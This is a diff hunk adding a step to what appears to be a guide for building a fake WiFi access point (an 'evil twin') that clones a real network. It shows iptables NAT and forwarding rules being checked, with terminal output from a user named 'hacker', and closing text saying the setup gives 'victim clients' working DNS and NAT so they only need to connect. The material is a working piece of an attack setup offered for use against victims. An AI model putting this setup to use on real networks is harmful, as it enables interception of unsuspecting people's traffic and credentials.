@@ -112,3 +112,39 @@ sudo iptables -A INPUT -i eth0 -j ACCEPT
 sudo iptables -A OUTPUT -o eth0 -j ACCEPT
 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 
+##############################################################
+# Check the traffic rules (8):
+##############################################################
+
+hacker@lol:/var/www/myportal$ sudo iptables -t nat -L -v
+Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+
+Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+
+Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+
+Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+  235 16526 MASQUERADE  all  --  any    wlx00c0cab0312a  anywhere             anywhere            
+hacker@lol:/var/www/myportal$ 
+
+hacker@lol:/var/www/myportal$ sudo iptables -L -v
+Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+ 2010  158K ACCEPT     all  --  at0    wlx00c0cab0312a  anywhere             anywhere            
+ 1731  326K ACCEPT     all  --  any    any     anywhere             anywhere             state RELATED,ESTABLISHED
+
+Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+hacker@lol:/var/www/myportal$ 
+
+wlx00c0cab0312a its my interface to give victim clients conection to internet cause we conf the rules traffic to pass at0 traffic to wlx00c0cab0312a.
+
+With all confs this you are ready to have a fake WiFi that clones the real and has functional DNS/NAT for the victims.
+You only need that the victim connects to fake wifi and nothing more.
